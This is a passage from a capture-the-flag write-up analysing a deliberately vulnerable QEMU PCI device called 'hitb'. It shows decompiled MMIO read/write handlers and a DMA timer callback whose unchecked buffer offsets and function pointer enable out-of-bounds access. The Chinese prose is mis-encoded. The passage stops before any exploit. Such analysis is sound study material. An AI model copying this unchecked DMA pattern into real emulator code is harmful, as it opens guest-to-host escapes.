0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br></pre></td></tr></table></figure><p>resourceæ–‡ä»¶å†…å®¹çš„æ ¼å¼ä¸ºstart end flag ã€‚åœ¨resource0æ–‡ä»¶ä¸­ï¼Œæ ¹æ®è¿™é‡Œæ²¡æœ‰resource1æ–‡ä»¶æˆ–è€…æ ¹æ®flagæœ€åä¸€ä½ä¸º0å¯çŸ¥å­˜åœ¨ä¸€ä¸ªMMIOçš„å†…å­˜ç©ºé—´ï¼Œåœ°å€ä¸º0xfea00000ï¼Œå¤§å°ä¸º0x100000ã€‚</p><p>å…¶æ¬¡åˆ†ææ³¨å†Œçš„å‡½æ•°ï¼Œé€šè¿‡<code>pci_hitb_realize</code>å‡½æ•°æŸ¥çœ‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">pci_hitb_realize</span><span class="params">(HitbState *pdev, Error_0 **errp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  pdev-&gt;pdev.config[<span class="number">61</span>] = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !msi_init(&amp;pdev-&gt;pdev, <span class="number">0</span>, <span class="number">1u</span>, <span class="number">1</span>, <span class="number">0</span>, errp) )</span><br><span class="line">  &#123;</span><br><span class="line">    timer_init_tl(&amp;pdev-&gt;dma_timer, main_loop_tlg.tl[<span class="number">1</span>], <span class="number">1000000</span>, (QEMUTimerCB *)hitb_dma_timer, pdev);</span><br><span class="line">    qemu_mutex_init(&amp;pdev-&gt;thr_mutex);</span><br><span class="line">    qemu_cond_init(&amp;pdev-&gt;thr_cond);</span><br><span class="line">    qemu_thread_create(&amp;pdev-&gt;thread, (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;stru_5AB2C8.not_legacy_32bit + <span class="number">12</span>, hitb_fact_thread, pdev, <span class="number">0</span>);</span><br><span class="line">    memory_region_init_io(&amp;pdev-&gt;mmio, &amp;pdev-&gt;pdev.qdev.parent_obj, &amp;hitb_mmio_ops, pdev, <span class="string">&quot;hitb-mmio&quot;</span>, <span class="number">0x100000</span>uLL);</span><br><span class="line">    pci_register_bar(&amp;pdev-&gt;pdev, <span class="number">0</span>, <span class="number">0</span>, &amp;pdev-&gt;mmio);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆå¯ä»¥çœ‹åˆ°åœ¨<code>timer_init_tl</code>å‡½æ•°æ˜¯å°†<code>hitb_dma_timer</code>ä½œä¸ºå›è°ƒå‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">timer_init_tl</span><span class="params">(QEMUTimer_0 *ts, QEMUTimerList_0 *timer_list, <span class="keyword">int</span> scale, QEMUTimerCB *cb, <span class="keyword">void</span> *opaque)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  ts-&gt;timer_list = timer_list;</span><br><span class="line">  ts-&gt;cb = cb;</span><br><span class="line">  ts-&gt;opaque = opaque;</span><br><span class="line">  ts-&gt;scale = scale;</span><br><span class="line">  ts-&gt;expire_time = <span class="number">-1LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¥ç€åœ¨ä¸‹é¢æ³¨å†Œäº†<code>hitb_mmio_ops</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.data.rel.ro:<span class="number">00000000009690</span>A0 <span class="number">40</span> <span class="number">44</span> <span class="number">28</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> A0 <span class="number">41</span>+hitb_mmio_ops dq offset hitb_mmio_read                ; read</span><br><span class="line">.data.rel.ro:<span class="number">00000000009690</span>A0 <span class="number">28</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>+                                        ; DATA XREF: pci_hitb_realize+<span class="number">99</span>â†‘o</span><br><span class="line">.data.rel.ro:<span class="number">00000000009690</span>A0 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>+dq offset hitb_mmio_write               ; write</span><br><span class="line">.data.rel.ro:<span class="number">00000000009690</span>A0 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>+dq <span class="number">0</span></span><br></pre></td></tr></table></figure><p>æ‰€ä»¥è¿™é‡Œéœ€è¦é‡ç‚¹æ³¨æ„çš„ä¹Ÿå°±æ˜¯è¿™æ ·ä¸‰ä¸ªå‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hitb_mmio_read</span><br><span class="line">hitb_mmio_write</span><br><span class="line">hitb_dma_timer</span><br></pre></td></tr></table></figure><h3 id="åˆ†æå‡½æ•°"><a href="#åˆ†æå‡½æ•°" class="headerlink" title="åˆ†æå‡½æ•°"></a>åˆ†æå‡½æ•°</h3><p>åœ¨åˆ†æå‡½æ•°ä¹‹å‰è¿˜éœ€è¦ææ‡‚è®¾å¤‡ç»“æ„ä½“ï¼Œå…·ä½“å¯ä»¥åœ¨view-&gt;Open Subviews-&gt;Local Type(shift + F1)ä¸­æœç´¢</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">attribute__</span>((<span class="title">aligned</span>(16))) <span class="title">HitbState</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  PCIDevice_0 pdev;</span><br><span class="line">  MemoryRegion_0 mmio;</span><br><span class="line">  QemuThread_0 thread;</span><br><span class="line">  QemuMutex_0 thr_mutex;</span><br><span class="line">  QemuCond_0 thr_cond;</span><br><span class="line">  <span class="keyword">bool</span> stopping;</span><br><span class="line">  <span class="keyword">uint32_t</span> addr4;</span><br><span class="line">  <span class="keyword">uint32_t</span> fact;</span><br><span class="line">  <span class="keyword">uint32_t</span> status;</span><br><span class="line">  <span class="keyword">uint32_t</span> irq_status;</span><br><span class="line">  dma_state dma;</span><br><span class="line">  QEMUTimer_0 dma_timer;</span><br><span class="line">  <span class="keyword">char</span> dma_buf[<span class="number">4096</span>];</span><br><span class="line">  <span class="keyword">void</span> (*enc)(<span class="keyword">char</span> *, <span class="keyword">unsigned</span> <span class="keyword">int</span>);</span><br><span class="line">  <span class="keyword">uint64_t</span> dma_mask;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dma_state</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">dma_addr_t</span> src;</span><br><span class="line">  <span class="keyword">dma_addr_t</span> dst;</span><br><span class="line">  <span class="keyword">dma_addr_t</span> cnt;</span><br><span class="line">  <span class="keyword">dma_addr_t</span> cmd;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">uint64_t</span> __fastcall <span class="title">hitb_mmio_read</span><span class="params">(HitbState *opaque, hwaddr addr, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">uint64_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">uint64_t</span> val; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  result = <span class="number">-1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( size == <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr == <span class="number">128</span> )</span><br><span class="line">      <span class="keyword">return</span> opaque-&gt;dma.src;</span><br><span class="line">    <span class="keyword">if</span> ( addr &gt; <span class="number">0x80</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( addr == <span class="number">140</span> )</span><br><span class="line">        <span class="keyword">return</span> *(<span class="keyword">dma_addr_t</span> *)((<span class="keyword">char</span> *)&amp;opaque-&gt;dma.dst + <span class="number">4</span>);</span><br><span class="line">      <span class="keyword">if</span> ( addr &lt;= <span class="number">0x8C</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( addr == <span class="number">132</span> )</span><br><span class="line">          <span class="keyword">return</span> *(<span class="keyword">dma_addr_t</span> *)((<span class="keyword">char</span> *)&amp;opaque-&gt;dma.src + <span class="number">4</span>);</span><br><span class="line">        <span class="keyword">if</span> ( addr == <span class="number">136</span> )</span><br><span class="line">          <span class="keyword">return</span> opaque-&gt;dma.dst;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( addr == <span class="number">144</span> )</span><br><span class="line">          <span class="keyword">return</span> opaque-&gt;dma.cnt;</span><br><span class="line">        <span class="keyword">if</span> ( addr == <span class="number">152</span> )</span><br><span class="line">          <span class="keyword">return</span> opaque-&gt;dma.cmd;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( addr == <span class="number">8</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        qemu_mutex_lock(&amp;opaque-&gt;thr_mutex);</span><br><span class="line">        val = opaque-&gt;fact;</span><br><span class="line">        qemu_mutex_unlock(&amp;opaque-&gt;thr_mutex);</span><br><span class="line">        <span class="keyword">return</span> val;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( addr &lt;= <span class="number">8</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        result = <span class="number">0x10000ED</span>LL;</span><br><span class="line">        <span class="keyword">if</span> ( !addr )</span><br><span class="line">          <span class="keyword">return</span> result;</span><br><span class="line">        <span class="keyword">if</span> ( addr == <span class="number">4</span> )</span><br><span class="line">          <span class="keyword">return</span> opaque-&gt;addr4;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( addr == <span class="number">32</span> )</span><br><span class="line">          <span class="keyword">return</span> opaque-&gt;status;</span><br><span class="line">        <span class="keyword">if</span> ( addr == <span class="number">36</span> )</span><br><span class="line">          <span class="keyword">return</span> opaque-&gt;irq_status;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>éœ€è¦æ»¡è¶³<code>size == 4</code>æ‰èƒ½è¯»å–</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">hitb_mmio_write</span><span class="params">(HitbState *opaque, hwaddr addr, <span class="keyword">uint64_t</span> val, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">uint32_t</span> v4; <span class="comment">// r13d</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">bool</span> v6; <span class="comment">// zf</span></span><br><span class="line">  <span class="keyword">int64_t</span> ns; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (addr &gt; <span class="number">0x7F</span> || size == <span class="number">4</span>) &amp;&amp; (((size - <span class="number">4</span>) &amp; <span class="number">0xFFFFFFFB</span>) == <span class="number">0</span> || addr &lt;= <span class="number">0x7F</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr == <span class="number">128</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (opaque-&gt;dma.cmd &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">        opaque-&gt;dma.src = val;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v4 = val;</span><br><span class="line">      <span class="keyword">if</span> ( addr &gt; <span class="number">0x80</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( addr == <span class="number">140</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( (opaque-&gt;dma.cmd &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">            *(<span class="keyword">dma_addr_t</span> *)((<span class="keyword">char</span> *)&amp;opaque-&gt;dma.dst + <span class="number">4</span>) = val;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( addr &gt; <span class="number">0x8C</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( addr == <span class="number">144</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( (opaque-&gt;dma.cmd &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">              opaque-&gt;dma.cnt = val;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span> <span class="keyword">if</span> ( addr == <span class="number">152</span> &amp;&amp; (val &amp; <span class="number">1</span>) != <span class="number">0</span> &amp;&amp; (opaque-&gt;dma.cmd &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            opaque-&gt;dma.cmd = val;</span><br><span class="line">            ns = qemu_clock_get_ns(QEMU_CLOCK_VIRTUAL_0);</span><br><span class="line">            timer_mod(&amp;opaque-&gt;dma_timer, ns / <span class="number">1000000</span> + <span class="number">100</span>);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( addr == <span class="number">132</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( (opaque-&gt;dma.cmd &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">            *(<span class="keyword">dma_addr_t</span> *)((<span class="keyword">char</span> *)&amp;opaque-&gt;dma.src + <span class="number">4</span>) = val;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( addr == <span class="number">136</span> &amp;&amp; (opaque-&gt;dma.cmd &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          opaque-&gt;dma.dst = val;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( addr == <span class="number">32</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( (val &amp; <span class="number">0x80</span>) != <span class="number">0</span> )</span><br><span class="line">          _InterlockedOr((<span class="keyword">volatile</span> <span class="keyword">signed</span> __int32 *)&amp;opaque-&gt;status, <span class="number">0x80</span>u);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          _InterlockedAnd((<span class="keyword">volatile</span> <span class="keyword">signed</span> __int32 *)&amp;opaque-&gt;status, <span class="number">0xFFFFFF7F</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( addr &gt; <span class="number">0x20</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( addr == <span class="number">96</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v6 = ((<span class="keyword">unsigned</span> <span class="keyword">int</span>)val | opaque-&gt;irq_status) == <span class="number">0</span>;</span><br><span class="line">          opaque-&gt;irq_status |= val;</span><br><span class="line">          <span class="keyword">if</span> ( !v6 )</span><br><span class="line">            hitb_raise_irq(opaque, <span class="number">0x60</span>u);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( addr == <span class="number">100</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v5 = ~(_DWORD)val;</span><br><span class="line">          v6 = (v5 &amp; opaque-&gt;irq_status) == <span class="number">0</span>;</span><br><span class="line">          opaque-&gt;irq_status &amp;= v5;</span><br><span class="line">          <span class="keyword">if</span> ( v6 &amp;&amp; !msi_enabled(&amp;opaque-&gt;pdev) )</span><br><span class="line">            pci_set_irq(&amp;opaque-&gt;pdev, <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( addr == <span class="number">4</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        opaque-&gt;addr4 = ~(_DWORD)val;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( addr == <span class="number">8</span> &amp;&amp; (opaque-&gt;status &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        qemu_mutex_lock(&amp;opaque-&gt;thr_mutex);</span><br><span class="line">        opaque-&gt;fact = v4;</span><br><span class="line">        _InterlockedOr((<span class="keyword">volatile</span> <span class="keyword">signed</span> __int32 *)&amp;opaque-&gt;status, <span class="number">1u</span>);</span><br><span class="line">        qemu_cond_signal(&amp;opaque-&gt;thr_cond);</span><br><span class="line">        qemu_mutex_unlock(&amp;opaque-&gt;thr_mutex);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŒæ ·éœ€è¦æ»¡è¶³<code>size == 4</code>ï¼Œå¹¶ä¸”åœ¨éƒ¨åˆ†æ“ä½œè¿˜éœ€è¦æ»¡è¶³<code>(opaque-&gt;dma.cmd &amp; 1) == 0</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">hitb_dma_timer</span><span class="params">(HitbState *opaque)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">dma_addr_t</span> cmd; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">uint8_t</span> *cnt_low; <span class="comment">// rsi</span></span><br><span class="line">  <span class="keyword">dma_addr_t</span> v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">dma_addr_t</span> v5; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">uint8_t</span> *v6; <span class="comment">// rbp</span></span><br><span class="line">  <span class="keyword">char</span> *v7; <span class="comment">// rbp</span></span><br><span class="line"></span><br><span class="line">  cmd = opaque-&gt;dma.cmd;</span><br><span class="line">  <span class="keyword">if</span> ( (cmd &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (cmd &amp; <span class="number">2</span>) != <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(LODWORD(opaque-&gt;dma.src) - <span class="number">0x40000</span>);</span><br><span class="line">      <span class="keyword">if</span> ( (cmd &amp; <span class="number">4</span>) != <span class="number">0</span> )                     <span class="comment">// 7</span></span><br><span class="line">      &#123;</span><br><span class="line">        v7 = &amp;opaque-&gt;dma_buf[v2];</span><br><span class="line">        opaque-&gt;enc(v7, opaque-&gt;dma.cnt);</span><br><span class="line">        cnt_low = (<span class="keyword">uint8_t</span> *)v7;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span>                                      <span class="comment">// 3</span></span><br><span class="line">      &#123;</span><br><span class="line">        cnt_low = (<span class="keyword">uint8_t</span> *)&amp;opaque-&gt;dma_buf[v2];</span><br><span class="line">      &#125;</span><br><span class="line">      cpu_physical_memory_rw(opaque-&gt;dma.dst, cnt_low, opaque-&gt;dma.cnt, <span class="number">1</span>);</span><br><span class="line">      v4 = opaque-&gt;dma.cmd;</span><br><span class="line">      v5 = v4 &amp; <span class="number">4</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>                                        <span class="comment">// 1</span></span><br><span class="line">    &#123;</span><br><span class="line">      v6 = (<span class="keyword">uint8_t</span> *)&amp;opaque[<span class="number">-36</span>] + (<span class="keyword">unsigned</span> <span class="keyword">int</span>)opaque-&gt;dma.dst - <span class="number">2824</span>;</span><br><span class="line">      LODWORD(cnt_low) = (_DWORD)opaque + opaque-&gt;dma.dst - <span class="number">0x40000</span> + <span class="number">3000</span>;</span><br><span class="line">      cpu_physical_memory_rw(opaque-&gt;dma.src, v6, opaque-&gt;dma.cnt, <span class="number">0</span>);</span><br><span class="line">      v4 = opaque-&gt;dma.cmd;</span><br><span class="line">      v5 = v4 &amp; <span class="number">4</span>;</span><br><span class="line">      <span class="keyword">if</span> ( (v4 &amp; <span class="number">4</span>) != <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        cnt_low = (<span class="keyword">uint8_t</span> *)LODWORD(opaque-&gt;dma.cnt);</span><br><span class="line">        opaque-&gt;enc((<span class="keyword">char</span> *)v6, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)cnt_low);</span><br><span class="line">        v4 = opaque-&gt;dma.cmd;</span><br><span class="line">        v5 = v4 &amp; <span class="number">4</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    opaque-&gt;dma.cmd = v4 &amp; <span class="number">0xFFFFFFFFFFFFFFFE</span>LL;</span><br><span class="line">    <span class="keyword">if</span> ( v5 )</span><br><span class="line">    &#123;</span><br><span class="line">      opaque-&gt;irq_status |= <span class="number">0x100</span>u;</span><br><span class="line">      hitb_raise_irq(opaque, (<span class="keyword">uint32_t</span>)cnt_low);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå°±æ˜¯å›è°ƒå‡½æ•°äº†ï¼Œåœ¨ä¸Šé¢çš„<code>hitb_mmio_write</code>å‡½æ•°ä¸­ï¼Œå½“æ»¡è¶³<code>if ( addr == 0x98 &amp;&amp; (val &amp; 1) != 0 &amp;&amp; (opaque-&gt;dma.cmd &amp; 1) == 0 )</code>å°±ä¼šè°ƒç”¨äº†ã€‚è€Œåœ¨è¿™ä¸ªå‡½æ•°ä¸­å­˜åœ¨è¿™æ ·ä¸€ä¸ªå‡½æ•°<code>cpu_physical_memory_rw</code>ï¼Œè¿™ä¸ªå‡½æ•°åœ¨æˆ‘ç¿»çœ‹æ‰‹å†Œçš„æ—¶å€™è¿˜å‘ç°äº†å…¶ä»–ç±»ä¼¼çš„å‡½æ•°<code>cpu_physical_memory_read</code>ã€<code>cpu_physical_memory_write</code>æ‰€ä»¥å¯ä»¥çŒœæµ‹å¾—åˆ°è¿™ä¸ªå‡½æ•°åˆ°åº•æ˜¯å¹²ä»€ä¹ˆçš„ã€‚è¿™ä¸ªå‡½æ•°å°±æ˜¯ç”¨äºä¼ 